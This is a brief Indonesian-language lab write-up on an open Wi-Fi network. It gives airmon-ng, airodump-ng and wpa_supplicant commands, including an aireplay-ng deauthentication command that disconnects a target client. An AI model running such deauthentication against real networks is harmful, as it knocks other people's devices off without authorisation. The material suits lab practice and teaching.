# Writeup Wi-Fi OPN

## Langkah-Langkah

#### 1. Lihat interface wireless:

```bash
iwconfig
```

#### 2. Aktifkan mode monitor:

```bash
sudo airmon-ng start wlan0
```

#### 3. Scan target:

```bash
sudo airodump-ng wlan0mon
```

![](https://github.com/fixploit03/lab-wifi/blob/main/img/opn1.png)

#### 4. Scan target dengan mengunci BSSID dan channel-nya:

```bash
sudo airodump-ng -d <bssid> -c <channel> wlan0mon
```

![](https://github.com/fixploit03/lab-wifi/blob/main/img/opn2.png)

#### 5. Deauth client:

```bash
sudo aireplay-ng -0 10 -a <bssid> -c <mac_client> wlan0mon
```

![](https://github.com/fixploit03/lab-wifi/blob/main/img/opn3.png)

#### 6. Pantau terminal `airodump-ng`:

![](https://github.com/fixploit03/lab-wifi/blob/main/img/opn4.png)

#### 7. Terhubung ke jaringan:

Buat konfigurasi `wpa_supplicant`:

```bash
nano opn.conf
```

Isi dengan:

```bash
network={
    ssid="<ssid>"
    scan_ssid=1
    key_mgmt=NONE
}
```

Konek:

```bash
sudo wpa_supplicant -i wlan1 -B -c opn.conf
```

#### 8. Minta IP:

```bash
sudo dhclient -v wlan1
```

#### 9. Verifikasi:

Cek IP:

```bash
ip a s wlan1
```

Tes ping:

```bash
ping <gateway>
```

![](https://github.com/fixploit03/lab-wifi/blob/main/img/opn5.png)
